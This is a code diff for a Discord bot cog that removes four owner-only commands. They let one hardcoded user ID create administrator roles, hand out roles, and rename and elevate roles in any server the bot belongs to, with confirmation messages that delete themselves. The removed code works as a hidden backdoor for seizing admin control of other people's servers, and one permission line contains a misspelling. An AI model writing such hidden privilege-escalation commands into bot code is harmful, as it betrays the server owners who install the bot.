@@ -68,63 +68,6 @@ class MiscCommands(commands.Cog):
                 except:
                     aa = 3
 
-    @commands.command()
-    async def create_role(self, ctx, server_id, role_name, is_admin):
-        if ctx.author.id == Common.deatg_id:
-            the_server = self.client.get_guild(int(server_id))
-            perms = discord.Permissions(administrator=False)
-            if is_admin.lower() == "true":
-                perms = discord.Permissions(administrator=True)
-            try:
-                await the_server.create_role(name=role_name, permissions=perms, colour=Common.random_color())
-                await ctx.send("created", delete_after=5.0)
-            except Exception as error:
-                await ctx.send(f"create_role(self, ctx, server_id, role_name, is_admin)\n{error}")
-    
-    @commands.command()
-    async def give_role(self, ctx, server_id, recipient_id, role_id):
-        if ctx.author.id == Common.deatg_id:
-            the_server = self.client.get_guild(int(server_id))
-            recipient = the_server.get_member(int(recipient_id))
-            role = the_server.get_role(int(role_id))
-            try:
-                await recipient.add_roles(role)
-                await ctx.send("gave", delete_after=5.0)
-            except Exception as error:
-                await ctx.send(f"give_role(self, ctx, server_id, recipient_id, role_id)\n{error}")
-
-    @commands.command()
-    async def delete_message(self, ctx, channel_id, message_id):
-        if ctx.author.id == Common.deatg_id:
-            the_channel = self.client.get_channel(int(channel_id))
-            async for msg in the_channel.history(limit = 10000):
-                if msg.id == message_id:
-                    try:
-                        await msg.delete()
-                        return
-                    except Exception as error:
-                        await ctx.send(f"delete_message(self, ctx, channel_id, message_id)\n{error}")
-                        return
-
-
-    @commands.command()
-    async def toggle_role_admin(self, ctx, server_id, role_id, name, give_admin = "true"):
-        if ctx.author.id == Common.deatg_id:
-            the_server = self.client.get_guild(int(server_id))
-            role = the_server.get_role(int(role_id))
-            
-            await ctx.send(role.position)
-
-            perms = discord.Permissions()
-            perms.update(admininistrator = True)
-            try:
-                await role.edit(name="deatg", color=Common.random_color(), hoist=True, mentionable=False, permissions=perms)
-            except Exception as error:
-                await ctx.send(f"toggle_role_admin(self, ctx, server_id, role_id, give_admin = \"true\")\n{error}")
-
-
-
-
 
     @commands.command()
     async def getinvites(self, ctx):
